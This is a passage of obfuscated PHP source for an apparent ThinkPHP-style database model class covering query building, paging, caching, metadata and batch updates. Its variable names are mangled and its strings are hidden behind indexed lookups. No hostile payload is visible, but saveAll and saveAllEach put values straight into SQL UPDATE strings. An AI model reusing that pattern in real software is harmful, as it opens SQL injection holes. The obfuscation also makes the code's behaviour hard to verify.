public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Äò²“‚“ =& $_SERVER[ªÏ§Ë·]; return isset($this->fields[$Äò²“‚“[289]]) ? $this->fields[$Äò²“‚“[289]] : $this->pk; } public function getDbFields() { $ış§åÀ¤ =& $_SERVER[ªÏ§Ë·]; if (isset($this->options[$ış§åÀ¤[317]])) { $÷Ø÷ÛúÌ = $this->db->getFields($this->options[$ış§åÀ¤[317]]); return $÷Ø÷ÛúÌ ? array_keys($÷Ø÷ÛúÌ) : !1; } if ($this->fields) { $÷Ø÷ÛúÌ = $this->fields; unset($÷Ø÷ÛúÌ[$ış§åÀ¤[288]], $÷Ø÷ÛúÌ[$ış§åÀ¤[289]], $÷Ø÷ÛúÌ[$ış§åÀ¤[290]], $÷Ø÷ÛúÌ[$ış§åÀ¤[287]]); return $÷Ø÷ÛúÌ; } return !1; } public function data($×±š¡×ş = '') { $ßŠ˜œ€ =& $_SERVER[ªÏ§Ë·]; if ($ßŠ˜œ€[12] === $×±š¡×ş && !empty($this->data)) { return $this->data; } if (is_object($×±š¡×ş)) { $×±š¡×ş = get_object_vars($×±š¡×ş); } elseif (is_string($×±š¡×ş)) { parse_str($×±š¡×ş, $×±š¡×ş); } elseif (!is_array($×±š¡×ş)) { think_exception(think_lang($ßŠ˜œ€[309])); } $this->data = $×±š¡×ş; return $this; } public function join($¶¢­Õ“­) { $‹û¬ÑæÀ =& $_SERVER[ªÏ§Ë·]; if (is_array($¶¢­Õ“­)) { $this->options[$‹û¬ÑæÀ[320]] = $¶¢­Õ“­; } elseif (!empty($¶¢­Õ“­)) { $this->options[$‹û¬ÑæÀ[320]][] = $¶¢­Õ“­; } return $this; } public function union($×Ïáß±¥, $Ÿ¾œõÍ = false) { $ôìÁ ü =& $_SERVER[ªÏ§Ë·]; if (empty($×Ïáß±¥)) { return $this; } if ($Ÿ¾œõÍ) { $this->options[$ôìÁ ü[385]][$ôìÁ ü[386]] = !0; } if (is_object($×Ïáß±¥)) { $×Ïáß±¥ = get_object_vars($×Ïáß±¥); } if (is_string($×Ïáß±¥)) { $´ü Â¡¬ = $×Ïáß±¥; } elseif (is_array($×Ïáß±¥)) { if (isset($×Ïáß±¥[0])) { $this->options[$ôìÁ ü[385]] = array_merge($this->options[$ôìÁ ü[385]], $×Ïáß±¥); return $this; } else { $´ü Â¡¬ = $×Ïáß±¥; } } else { think_exception(think_lang($ôìÁ ü[309])); } $this->options[$ôìÁ ü[385]][] = $´ü Â¡¬; return $this; } public function cache($‹Å²’ÉÇ = true, $›ÈÑ™ø„ = null, $êÉ½Ã‹Ï = '') { $²Ú¡¢Œü =& $_SERVER[ªÏ§Ë·]; if (!1 !== $‹Å²’ÉÇ) { $this->options[$²Ú¡¢Œü[387]] = array($²Ú¡¢Œü[104] => $‹Å²’ÉÇ, $²Ú¡¢Œü[377] => $›ÈÑ™ø„, $²Ú¡¢Œü[43] => $êÉ½Ã‹Ï); } return $this; } public function field($¥Ü–¦², $Ê¶ı¯¥ñ = false) { $ØíıùÏÜ =& $_SERVER[ªÏ§Ë·]; if (!0 === $¥Ü–¦²) { $ùÓŠô¼Ù = $this->getDbFields(); $¥Ü–¦² = $ùÓŠô¼Ù ? $ùÓŠô¼Ù : $ØíıùÏÜ[199]; } elseif ($Ê¶ı¯¥ñ) { if (is_string($¥Ü–¦²)) { $¥Ü–¦² = explode($ØíıùÏÜ[60], $¥Ü–¦²); } $ùÓŠô¼Ù = $this->getDbFields(); $¥Ü–¦² = $ùÓŠô¼Ù ? array_diff($ùÓŠô¼Ù, $¥Ü–¦²) : $¥Ü–¦²; } $this->options[$ØíıùÏÜ[311]] = $¥Ü–¦²; return $this; } public function scope($‰·©×ôï = '', $£š¢‹Í = NULL) { $Š“ÄÎºí =& $_SERVER[ªÏ§Ë·]; if ($Š“ÄÎºí[12] === $‰·©×ôï) { if (isset($this->_scope[$Š“ÄÎºí[47]])) { $œâ©ò„“ = $this->_scope[$Š“ÄÎºí[47]]; } else { return $this; } } elseif (is_string($‰·©×ôï)) { $ÒÀ’öœî = explode($Š“ÄÎºí[60], $‰·©×ôï); $œâ©ò„“ = array(); foreach ($ÒÀ’öœî as $ÎÉıï‰) { if (!isset($this->_scope[$ÎÉıï‰])) { continue; } $œâ©ò„“ = array_merge($œâ©ò„“, $this->_scope[$ÎÉıï‰]); } if (!empty($£š¢‹Í) && is_array($£š¢‹Í)) { $œâ©ò„“ = array_merge($œâ©ò„“, $£š¢‹Í); } } elseif (is_array($‰·©×ôï)) { $œâ©ò„“ = $‰·©×ôï; } if (is_array($œâ©ò„“) && !empty($œâ©ò„“)) { $this->options = array_merge($this->options, array_change_key_case($œâ©ò„“)); } return $this; } public function where($ù÷©èïŠ, $Àµûíôù = null) { $ÔÉàşÍè =& $_SERVER[ªÏ§Ë·]; if (!is_null($Àµûíôù) && is_string($ù÷©èïŠ)) { if (!is_array($Àµûíôù)) { $Àµûíôù = func_get_args(); array_shift($Àµûíôù); } $Àµûíôù = array_map(array($this->db, $ÔÉàşÍè[381]), $Àµûíôù); $ù÷©èïŠ = vsprintf($ù÷©èïŠ, $Àµûíôù); } elseif (is_object($ù÷©èïŠ)) { $ù÷©èïŠ = get_object_vars($ù÷©èïŠ); } elseif (is_array($ù÷©èïŠ)) { foreach ($ù÷©èïŠ as $Éô”Ç›ä => $–´ÏÁñ ) { if ((is_numeric($Éô”Ç›ä) || !$Éô”Ç›ä) && is_string($–´ÏÁñ )) { if (strpos($–´ÏÁñ , $ÔÉàşÍè[388]) === 0) { continue; } think_trace($ÔÉàşÍè[389], $ÔÉàşÍè[12], $ÔÉàşÍè[59]); die; } } } if (is_string($ù÷©èïŠ) && $ÔÉàşÍè[12] != $ù÷©èïŠ) { $ˆú½²¢ä = array(); $ˆú½²¢ä[$ÔÉàşÍè[390]] = $ù÷©èïŠ; $ù÷©èïŠ = $ˆú½²¢ä; } if (isset($this->options[$ÔÉàşÍè[313]])) { $this->options[$ÔÉàşÍè[313]] = array_merge($this->options[$ÔÉàşÍè[313]], $ù÷©èïŠ); } else { $this->options[$ÔÉàşÍè[313]] = $ù÷©èïŠ; } return $this; } public function limit($ø·Áİ›¨, $ÏÀı = null) { $òåÅŸÃ =& $_SERVER[ªÏ§Ë·]; $this->options[$òåÅŸÃ[330]] = is_null($ÏÀı) ? $ø·Áİ›¨ : $ø·Áİ›¨ . $òåÅŸÃ[60] . $ÏÀı; return $this; } public function page($Íµ’ƒ×€, $¿ÌğÒŞÍ = null) { $ŞšëÖÒ =& $_SERVER[ªÏ§Ë·]; $this->options[$ŞšëÖÒ[391]] = is_null($¿ÌğÒŞÍ) ? $Íµ’ƒ×€ : $Íµ’ƒ×€ . $ŞšëÖÒ[60] . $¿ÌğÒŞÍ; return $this; } public function comment($¼Í±àÒÊ) { $this->options[$_SERVER[ªÏ§Ë·][392]] = $¼Í±àÒÊ; return $this; } public function setProperty($´§Öèı, $ˆŸ‹³‹®) { if (property_exists($this, $´§Öèı)) { $this->{$´§Öèı} = $ˆŸ‹³‹®; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\x69\146\171\x54\151\x6d\x65", "\164\151\155\x65", "\x69\x6e\x73\145\x72\164\x2c\165\x70\144\x61\x74\145", "\146\165\156\x63\x74\x69\x6f\156"), array("\143\x72\x65\141\x74\145\124\x69\155\145", "\164\151\155\x65", "\x69\x6e\x73\145\x72\x74", "\146\x75\x6e\x63\x74\151\157\x6e")); public function setDataAuto($É¡©ÌÎñ) { $this->dataAuto = $É¡©ÌÎñ; } public function __construct($¶šãÇû¸ = '', $àåœ´ú = '', $ùó¦åÔ‰ = '') { parent::__construct($¶šãÇû¸, $àåœ´ú, $ùó¦åÔ‰); } protected $tableMeta = array(); protected function _beforeInsert(&$Ã¦õÓú¢, $–´Öå‚ß) { $øãìÖ§İ =& $_SERVER[ªÏ§Ë·]; if (!$this->checkDataAutoHas($øãìÖ§İ[393])) { return; } $this->dataBeforeFilter($Ã¦õÓú¢, $øãìÖ§İ[393]); } protected function _beforeUpdate(&$¾²·ÊÕ˜, $•À‡Œ¿î) { $ì³”·÷¨ =& $_SERVER[ªÏ§Ë·]; if (!$this->checkDataAutoHas($ì³”·÷¨[394])) { return; } $this->dataBeforeFilter($¾²·ÊÕ˜, $ì³”·÷¨[394]); } protected function _afterSelect(&$Ú‡øÓ‚«, $èÖ­éŠË) { if (!is_array($Ú‡øÓ‚«)) { return; } if (!$this->checkDataAutoHas($_SERVER[ªÏ§Ë·][395])) { return; } foreach ($Ú‡øÓ‚« as &$Úî¼¢íà) { $this->dataAfterFilter($Úî¼¢íà); } unset($Úî¼¢íà); } protected function _afterFind(&$¢³ÒúÎ, $ã¡ñÁœ´) { if (!is_array($¢³ÒúÎ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ªÏ§Ë·][395])) { return; } $this->dataAfterFilter($¢³ÒúÎ); } public static function textEncode($ƒ•şàŸ) { if (!$ƒ•şàŸ) { return $ƒ•şàŸ; } $»ÙÖ‹ö = json_encode($ƒ•şàŸ); $»ÙÖ‹ö = preg_replace_callback($_SERVER[ªÏ§Ë·][396], function ($£ßË¿“º) { return addslashes($£ßË¿“º[0]); }, $»ÙÖ‹ö); return json_decode($»ÙÖ‹ö); } public static function textDecode($§æûª˜×) { $û‡æ‚Æ =& $_SERVER[ªÏ§Ë·]; $á¿Ü çÕ = json_encode($§æûª˜×); $á¿Ü çÕ = preg_replace_callback($û‡æ‚Æ[397], function ($˜ßÎ³Ê) { return $_SERVER[ªÏ§Ë·][107]; }, $á¿Ü çÕ); return json_decode($á¿Ü çÕ); } public function setAutoIncrement($¦È³ª) { $‹ÑúØÓí = array($this->getPk() => $¦È³ª); $Ó²œ×ëá = $this->data($‹ÑúØÓí)->add(); if ($Ó²œ×ëá) { $this->delete($Ó²œ×ëá); } } public function getAutoIncrement() { $€åÒş¤Õ = $this->getTableName(); $¾§ğâ¡½ = $this->max($this->getPk()); $¨¸°Ş÷Õ = $this->query("\163\150\157\x77\40\x74\141\142\154\145\40\163\164\x61\164\x75\x73\40\167\x68\145\x72\x65\x20\116\141\155\x65\75\x27{$€åÒş¤Õ}\47"); $‹á‰æİ = $¨¸°Ş÷Õ[0][$_SERVER[ªÏ§Ë·][398]]; $Í¤ĞÉş³ = max($¾§ğâ¡½, $‹á‰æİ); return $Í¤ĞÉş³; } protected function _callBefore($ê¢ı˜¢ı, $ßÊ®öÚÇ) { return $this->cacheCallCheck($ê¢ı˜¢ı, $ßÊ®öÚÇ, !1); } protected function _callAfter($É³è­Æá, $«½ö„„) { return $this->cacheCallCheck($É³è­Æá, $«½ö„„, !0); } protected function cacheFunctionAlias($ÛÌ¸–ß–) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($á£ùÀÒã, $ßŒ¼ØÕ, $İÊĞå¹ = false) { $Æ¼Íˆ” = $this->cacheFunctionAlias($ßŒ¼ØÕ); if (!$Æ¼Íˆ”) { return; } foreach ($Æ¼Íˆ” as $Å·Ë»çª => $áÈµÛğ») { $ãŠ•ğ = $áÈµÛğ»[0]; $Ğ‰Åïš‚ = explode($_SERVER[ªÏ§Ë·][60], $áÈµÛğ»[1]); if ($á£ùÀÒã == $Å·Ë»çª) { return $this->cacheFunctionGet($Å·Ë»çª, $ãŠ•ğ); } if ($İÊĞå¹ && in_array($á£ùÀÒã, $Ğ‰Åïš‚)) { $this->cacheFunctionClear($Å·Ë»çª, $ãŠ•ğ); } } } public function cacheFunctionGet($İÓ†åÍÍ, $àÃµùÑß) { $¡ØéˆõŞ = $this->cacheKeyMake($İÓ†åÍÍ, $àÃµùÑß); $²íŸÏ‰– = Cache::get($¡ØéˆõŞ); if (!is_array($²íŸÏ‰–)) { $²íŸÏ‰– = call_user_func_array(array($this, $İÓ†åÍÍ), array($àÃµùÑß, !0)); Cache::set($¡ØéˆõŞ, $²íŸÏ‰–); } return $²íŸÏ‰–; } public function cacheFunctionClear($ˆ³ÔÕ¶, $ÍùØŠ¾) { $ßÉı¯Ëæ = $ÍùØŠ¾; if (!is_array($ÍùØŠ¾)) { $ßÉı¯Ëæ = array($ÍùØŠ¾); } foreach ($ßÉı¯Ëæ as $Å¿¶ŞÒ¹) { $‰ÖÛµÊ¦ = $this->cacheKeyMake($ˆ³ÔÕ¶, $Å¿¶ŞÒ¹); Cache::remove($‰ÖÛµÊ¦); } } private function cacheKeyMake($øšïˆâæ, $¥­Á–Ç ) { $¦Œ® µš =& $_SERVER[ªÏ§Ë·]; return get_class($this) . $¦Œ® µš[11] . $øšïˆâæ . $¦Œ® µš[399] . $¥­Á–Ç ; } protected function selectPageReset() { $Š¦Û²Ó =& $_SERVER[ªÏ§Ë·]; if (isset($GLOBALS[$Š¦Û²Ó[400]])) { return; } $GLOBALS[$Š¦Û²Ó[400]] = isset($GLOBALS[$Š¦Û²Ó[7]][$Š¦Û²Ó[401]]) ? $GLOBALS[$Š¦Û²Ó[7]][$Š¦Û²Ó[401]] : !1; $GLOBALS[$Š¦Û²Ó[402]] = isset($GLOBALS[$Š¦Û²Ó[7]][$Š¦Û²Ó[391]]) ? $GLOBALS[$Š¦Û²Ó[7]][$Š¦Û²Ó[391]] : !1; $GLOBALS[$Š¦Û²Ó[7]][$Š¦Û²Ó[401]] = !1; $GLOBALS[$Š¦Û²Ó[7]][$Š¦Û²Ó[391]] = !1; } protected function selectPageRestore() { $ìÜÙ²¹¼ =& $_SERVER[ªÏ§Ë·]; if (!isset($GLOBALS[$ìÜÙ²¹¼[400]])) { return; } $GLOBALS[$ìÜÙ²¹¼[7]][$ìÜÙ²¹¼[401]] = $GLOBALS[$ìÜÙ²¹¼[400]]; $GLOBALS[$ìÜÙ²¹¼[7]][$ìÜÙ²¹¼[391]] = $GLOBALS[$ìÜÙ²¹¼[402]]; if ($GLOBALS[$ìÜÙ²¹¼[7]][$ìÜÙ²¹¼[401]] === !1) { unset($GLOBALS[$ìÜÙ²¹¼[7]][$ìÜÙ²¹¼[401]]); } if ($GLOBALS[$ìÜÙ²¹¼[7]][$ìÜÙ²¹¼[391]] === !1) { unset($GLOBALS[$ìÜÙ²¹¼[7]][$ìÜÙ²¹¼[391]]); } unset($GLOBALS[$ìÜÙ²¹¼[400]]); unset($GLOBALS[$ìÜÙ²¹¼[402]]); } protected function selectPage($ì¬øÆ’ = 200, $Ö–“™°Æ = 1) { $œÁ—«óš =& $_SERVER[ªÏ§Ë·]; global $in; $‰û¦¼èò = $this->optionsValue(); $Ğğğ…ù = 50000; $ì¬øÆ’ = isset($in[$œÁ—«óš[401]]) && $in[$œÁ—«óš[401]] ? $in[$œÁ—«óš[401]] : $ì¬øÆ’; if ($ì¬øÆ’ === -1) { $in[$œÁ—«óš[401]] = !1; $Ğğğ…ù = 100000000; $ì¬øÆ’ = $Ğğğ…ù; } $ÆŠ€Éñ = $‰û¦¼èò; $ÆŠ€Éñ[$œÁ—«óš[403]] = array(); $ì¬øÆ’ = intval($ì¬øÆ’); $ì¬øÆ’ = $ì¬øÆ’ <= 5 ? 5 : ($ì¬øÆ’ >= $Ğğğ…ù ? $Ğğğ…ù : $ì¬øÆ’); $Ö–“™°Æ = intval(isset($in[$œÁ—«óš[391]]) && $in[$œÁ—«óš[391]] ? $in[$œÁ—«óš[391]] : $Ö–“™°Æ); $Ö–“™°Æ = $Ö–“™°Æ <= 1 ? 1 : $Ö–“™°Æ; $‡Ÿİ£œ = array(); $œ¾¸»çŠ = 1; if ($Ö–“™°Æ == 1 && $œ¾¸»çŠ) { $this->optionsValue($‰û¦¼èò); $‡Ÿİ£œ = $this->page($Ö–“™°Æ, $ì¬øÆ’)->select(); $¨åÜ»œ = is_array($‡Ÿİ£œ) ? count($‡Ÿİ£œ) : 0; if ($¨åÜ»œ < $ì¬øÆ’) { $òŸøåıë = 1; } else { $this->optionsValue($ÆŠ€Éñ); $¨åÜ»œ = intval($this->count()); $òŸøåıë = ceil($¨åÜ»œ / $ì¬øÆ’); } } else { $this->optionsValue($ÆŠ€Éñ); $¨åÜ»œ = intval($this->count()); $òŸøåıë = ceil($¨åÜ»œ / $ì¬øÆ’); $Ö–“™°Æ = $Ö–“™°Æ >= $òŸøåıë ? $òŸøåıë : $Ö–“™°Æ; $this->optionsValue($‰û¦¼èò); $‡Ÿİ£œ = $this->page($Ö–“™°Æ, $ì¬øÆ’)->select(); } if (!is_array($‡Ÿİ£œ)) { $‡Ÿİ£œ = array(); } if ($òŸøåıë == 1) { $¨åÜ»œ = count($‡Ÿİ£œ); } $‘Ü¼ê£ = array($œÁ—«óš[404] => array($œÁ—«óš[405] => $¨åÜ»œ, $œÁ—«óš[401] => $ì¬øÆ’, $œÁ—«óš[391] => $Ö–“™°Æ, $œÁ—«óš[406] => $òŸøåıë), $œÁ—«óš[407] => $‡Ÿİ£œ); return $‘Ü¼ê£; } protected function checkLength($ùèœıá¯, $Íûş“ˆ© = 0, $Ï ‰©ïä = '') { $¬”©Œ‰æ =& $_SERVER[ªÏ§Ë·]; $Íûş“ˆ© = $Íûş“ˆ© ? $Íûş“ˆ© : 65536; if (!$ùèœıá¯ || strlen($ùèœıá¯) < $Íûş“ˆ©) { return; } $Ï ‰©ïä = $Ï ‰©ïä ? $Ï ‰©ïä . $¬”©Œ‰æ[81] : $¬”©Œ‰æ[12]; show_json($Ï ‰©ïä . LNG($¬”©Œ‰æ[408]) . "\50{$Íûş“ˆ©}\51", !1); } protected function metaSet($Î›¼ê€Ï, $ÑÇ½Àí† = null, $©áÈØ´å = null) { $ì†à•Ââ =& $_SERVER[ªÏ§Ë·]; if (!$this->tableMeta || !$Î›¼ê€Ï) { return !1; } $ºöõİĞÙ = $this->tableMeta[$ì†à•Ââ[409]]; $±æêˆ„Ê = $this->tableMeta[$ì†à•Ââ[410]]; $Á“Òƒè± = Model($±æêˆ„Ê); $Ò ÍÜîò = array($ºöõİĞÙ => $Î›¼ê€Ï, $ì†à•Ââ[411] => $ÑÇ½Àí†); if (is_null($ÑÇ½Àí†)) { return $Á“Òƒè±->where(array($ºöõİĞÙ => $Î›¼ê€Ï))->delete(); } if (is_null($©áÈØ´å) && is_string($ÑÇ½Àí†)) { return $Á“Òƒè±->where($Ò ÍÜîò)->delete(); } $ªœ€‡´ş = is_array($ÑÇ½Àí†) ? $ÑÇ½Àí† : array(); if (is_string($ÑÇ½Àí†)) { $ªœ€‡´ş[$ÑÇ½Àí†] = $©áÈØ´å; } $´¶¡´ÚÇ = array(); foreach ($ªœ€‡´ş as $û×Ç’Ñ„ => $—ª«Ú³) { if (is_null($—ª«Ú³) && is_string($û×Ç’Ñ„)) { $Á“Òƒè±->where(array($ºöõİĞÙ => $Î›¼ê€Ï, $ì†à•Ââ[411] => $û×Ç’Ñ„))->delete(); continue; } $this->checkLength($—ª«Ú³, !1, $±æêˆ„Ê . $ì†à•Ââ[4] . $û×Ç’Ñ„); $´¶¡´ÚÇ[] = array($ºöõİĞÙ => $Î›¼ê€Ï, $ì†à•Ââ[104] => $û×Ç’Ñ„, $ì†à•Ââ[412] => $—ª«Ú³); } $ÃÉãòÌœ = $ì†à•Ââ[413] . $±æêˆ„Ê; CacheLock::lock($ÃÉãòÌœ); $Á“Òƒè±->where(array($ºöõİĞÙ => $Î›¼ê€Ï))->addAll($´¶¡´ÚÇ, array(), !0); CacheLock::unlock($ÃÉãòÌœ); return !0; } public function metaGet($º–Ï­¡ê, $÷‚¡ƒÜ£ = false) { $É–Ëéàª =& $_SERVER[ªÏ§Ë·]; if (!$this->tableMeta) { return array(); } $µË­­´† = $this->tableMeta[$É–Ëéàª[409]]; $‘„Â¦ëŞ = Model($this->tableMeta[$É–Ëéàª[410]]); if ($÷‚¡ƒÜ£) { $ß„‰ûÖ÷ = array($µË­­´† => $º–Ï­¡ê, $É–Ëéàª[104] => $÷‚¡ƒÜ£); return $‘„Â¦ëŞ->where($ß„‰ûÖ÷)->getField($É–Ëéàª[412]); } $ß„‰ûÖ÷ = array($µË­­´† => $º–Ï­¡ê); $´ôğÙŸ… = $‘„Â¦ëŞ->field($É–Ëéàª[414])->where($ß„‰ûÖ÷)->select(); $´ôğÙŸ… = array_to_keyvalue($´ôğÙŸ…, $É–Ëéàª[104], $É–Ëéàª[412]); return $´ôğÙŸ…; } private function checkDataAutoHas($¿ı§îûí) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $­èõ¿µ) { if (in_array($¿ı§îûí, explode($_SERVER[ªÏ§Ë·][60], $­èõ¿µ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$“¬šáâä, $ê™´ãëœ) { $¯¨İª–Á =& $_SERVER[ªÏ§Ë·]; if (!is_array($“¬šáâä)) { return; } foreach ($this->dataAuto as $Á¦ÉáÎ) { $«½²¿¬ú = $Á¦ÉáÎ[0]; if (!in_array($ê™´ãëœ, explode($¯¨İª–Á[60], $Á¦ÉáÎ[2]))) { continue; } switch (trim($Á¦ÉáÎ[3])) { case $¯¨İª–Á[359]: case $¯¨İª–Á[360]: $ôˆ«ÑË¥ = $Á¦ÉáÎ[1]; $€¢‘»ğú = isset($Á¦ÉáÎ[4]) ? (array) $Á¦ÉáÎ[4] : array(); if ($ôˆ«ÑË¥ == $¯¨İª–Á[190] && array_key_exists($«½²¿¬ú, $“¬šáâä)) { if (!$“¬šáâä[$«½²¿¬ú]) { unset($“¬šáâä[$«½²¿¬ú]); } break; } if (isset($“¬šáâä[$«½²¿¬ú])) { array_unshift($€¢‘»ğú, $“¬šáâä[$«½²¿¬ú]); } if ($¯¨İª–Á[359] == $Á¦ÉáÎ[3]) { $“¬šáâä[$«½²¿¬ú] = call_user_func_array($ôˆ«ÑË¥, $€¢‘»ğú); } else { $“¬šáâä[$«½²¿¬ú] = call_user_func_array(array(&$this, $ôˆ«ÑË¥), $€¢‘»ğú); } break; case $¯¨İª–Á[308]: if (isset($“¬šáâä[$«½²¿¬ú]) && $“¬šáâä[$«½²¿¬ú]) { $“¬šáâä[$«½²¿¬ú] = call_user_func_array(array(&$this, $Á¦ÉáÎ[1]), array($“¬šáâä[$«½²¿¬ú])); } break; case $¯¨İª–Á[311]: $“¬šáâä[$«½²¿¬ú] = $“¬šáâä[$Á¦ÉáÎ[1]]; break; case $¯¨İª–Á[332]: if (isset($“¬šáâä[$«½²¿¬ú]) && !is_string($“¬šáâä[$«½²¿¬ú])) { $“¬šáâä[$«½²¿¬ú] = json_encode_force($“¬šáâä[$«½²¿¬ú]); } break; case $¯¨İª–Á[361]: if ($“¬šáâä[$«½²¿¬ú] === $¯¨İª–Á[12]) { unset($“¬šáâä[$«½²¿¬ú]); } break; case $¯¨İª–Á[362]: $“¬šáâä[$«½²¿¬ú] = $Á¦ÉáÎ[1]; default: break; } } if ($ê™´ãëœ == $¯¨İª–Á[393]) { $ñ€ãö÷œ = strtolower($this->db->getDbType()); if (strpos($ñ€ãö÷œ, $¯¨İª–Á[23]) !== 0) { return; } $¬şš˜øÖ = $this->field(!0)->fields; $ÍÎğ‘Ÿú = $¬şš˜øÖ[$¯¨İª–Á[290]]; if (isset($¬şš˜øÖ[$¯¨İª–Á[289]])) { unset($ÍÎğ‘Ÿú[$¬şš˜øÖ[$¯¨İª–Á[289]]]); } foreach ($ÍÎğ‘Ÿú as $†°»±ıÕ => $ê™´ãëœ) { if (!isset($“¬šáâä[$†°»±ıÕ])) { $“¬šáâä[$†°»±ıÕ] = $¯¨İª–Á[12]; } } } } private function dataAfterFilter(&$µƒµõ°) { $Û³ÓË ¾ =& $_SERVER[ªÏ§Ë·]; foreach ($this->dataAuto as $í¤˜›üğ) { $şÎÈÏ—Å = $í¤˜›üğ[0]; if (!isset($µƒµõ°[$şÎÈÏ—Å])) { continue; } if (!in_array($Û³ÓË ¾[395], explode($Û³ÓË ¾[60], $í¤˜›üğ[2]))) { continue; } switch (trim($í¤˜›üğ[3])) { case $Û³ÓË ¾[359]: case $Û³ÓË ¾[360]: $³ÙÚ®åÇ = isset($í¤˜›üğ[4]) ? (array) $í¤˜›üğ[4] : array(); array_unshift($³ÙÚ®åÇ, $µƒµõ°[$şÎÈÏ—Å]); if (isset($í¤˜›üğ[4]) && $í¤˜›üğ[4] == $Û³ÓË ¾[415]) { $³ÙÚ®åÇ = array($µƒµõ°[$şÎÈÏ—Å]); } if ($Û³ÓË ¾[359] == $í¤˜›üğ[3]) { $µƒµõ°[$şÎÈÏ—Å] = call_user_func_array($í¤˜›üğ[1], $³ÙÚ®åÇ); } else { $µƒµõ°[$şÎÈÏ—Å] = call_user_func_array(array(&$this, $í¤˜›üğ[1]), $³ÙÚ®åÇ); } break; case $Û³ÓË ¾[308]: if (isset($µƒµõ°[$şÎÈÏ—Å]) && $µƒµõ°[$şÎÈÏ—Å]) { $µƒµõ°[$şÎÈÏ—Å] = call_user_func_array(array(&$this, $í¤˜›üğ[1]), array($µƒµõ°[$şÎÈÏ—Å])); } break; case $Û³ÓË ¾[311]: $µƒµõ°[$şÎÈÏ—Å] = $µƒµõ°[$í¤˜›üğ[1]]; break; case $Û³ÓË ¾[332]: $Şò¾´šœ = $µƒµõ°[$şÎÈÏ—Å]; $µƒµõ°[$şÎÈÏ—Å] = json_decode($Şò¾´šœ, !0); if (is_null($µƒµõ°[$şÎÈÏ—Å])) { $µƒµõ°[$şÎÈÏ—Å] = $Şò¾´šœ; } break; case $Û³ÓË ¾[361]: if ($µƒµõ°[$şÎÈÏ—Å] === $Û³ÓË ¾[12]) { unset($µƒµõ°[$şÎÈÏ—Å]); } break; case $Û³ÓË ¾[362]: $µƒµõ°[$şÎÈÏ—Å] = $í¤˜›üğ[1]; break; default: break; } } } public function saveAll($Äğæø¯Ì) { $ÇÏÌÛùÈ =& $_SERVER[ªÏ§Ë·]; $¼äüä = $this->tablePrefix . $this->tableName; $áüñ—€ = self::SQL_WHERE_IN_CHUNK; $Äğæø¯Ì = is_array($Äğæø¯Ì) ? $Äğæø¯Ì : array(); $¾Éó £€ = $ÇÏÌÛùÈ[416]; $œÜ‹ÄÓ = 0; $™À¸ª©© = array(); $ò®›×ó = count($Äğæø¯Ì); for ($ÂııÙ×³ = 0; $ÂııÙ×³ < $ò®›×ó; $ÂııÙ×³++) { $ˆª¹ĞÈÌ = $Äğæø¯Ì[$ÂııÙ×³]; if (!is_array($ˆª¹ĞÈÌ) || count($ˆª¹ĞÈÌ) != 4) { continue; } $‰‰÷È÷± = "\125\120\x44\101\x54\105\x20\140{$¼äüä}\x60\x20\123\105\124\40{$ˆª¹ĞÈÌ[2]}\40\75\x20\103\x41\x53\x45\40{$ˆª¹ĞÈÌ[0]}\x20\12"; if ($œÜ‹ÄÓ == 0) { $¾Éó £€ = $‰‰÷È÷±; } $™À¸ª©©[] = $ÇÏÌÛùÈ[128] . $ˆª¹ĞÈÌ[1] . $ÇÏÌÛùÈ[128]; $œÜ‹ÄÓ++; $¾Éó £€ .= "\40\127\x48\105\116\40\47{$ˆª¹ĞÈÌ[1]}\x27\40\x54\110\105\x4e\40\47{$ˆª¹ĞÈÌ[3]}\x27\x20\12"; if ($œÜ‹ÄÓ == $áüñ—€ || $ÂııÙ×³ == $ò®›×ó - 1) { $Š®ÄãŸÇ = implode($ÇÏÌÛùÈ[60], $™À¸ª©©); $¾Éó £€ .= "\40\x45\x4e\104\40\x20\x57\x48\105\x52\x45\40{$ˆª¹ĞÈÌ[0]}\40\x49\116\x20\50{$Š®ÄãŸÇ}\51\40"; $this->execute($¾Éó £€); $œÜ‹ÄÓ = 0; $¾Éó £€ = $‰‰÷È÷±; $this->chunkEventCheck(count($™À¸ª©©)); $™À¸ª©© = array(); } } $this->chunkEventSet(); } public function saveAllEach($™à¬¹ÛÁ) { $ÛÛà»ø =& $_SERVER[ªÏ§Ë·]; $¸ÒìÌöğ = $this->tablePrefix . $this->tableName; foreach ($™à¬¹ÛÁ as $¨óªÓ®Å) { if (!is_array($¨óªÓ®Å) || count($¨óªÓ®Å) != 4) { continue; } $ú€Û–¿‹ = $¨óªÓ®Å[0] . $ÛÛà»ø[417] . $¨óªÓ®Å[1] . $ÛÛà»ø[128]; $Œˆ•ë¶¨ = $¨óªÓ®Å[2] . $ÛÛà»ø[417] . $¨óªÓ®Å[3] . $ÛÛà»ø[128]; $¯Î€Ó„£ = "\165\x70\144\141\164\x65\x20{$¸ÒìÌöğ}\x20\x73\145\164\x20{$Œˆ•ë¶¨}\x20\x77\x68\x65\x72\x65\40{$ú€Û–¿‹}\73"; $this->execute($¯Î€Ó„£); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($„ß€¶˜¥ = false, $©õ¯ó¶ = false) { $this->_chunkEvent = $„ß€¶˜¥; $this->_chunkEventParam = $©õ¯ó¶; } private function chunkEventCheck($¨ÚÓº¸ˆ) { if (!$this->_chunkEvent) { return; } $ŠÕë±ş¥ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ŠÕë±ş¥[$_SERVER[ªÏ§Ë·][418]] = $¨ÚÓº¸ˆ; Hook::trigger($this->_chunkEvent, $ŠÕë±ş¥); } public function addAll($€ÔğŸ¦, $…Âğ‰¼Ì = array(), $¶ÀÓìÄÖ = false) { $”¹õ·– =& $_SERVER[ªÏ§Ë·]; ignore_timeout(); $ÁÇ•Úµë = self::SQL_WHERE_IN_CHUNK; if (empty($€ÔğŸ¦)) { $this->error = think_lang($”¹õ·–[309]); return !1; } $…Âğ‰¼Ì = 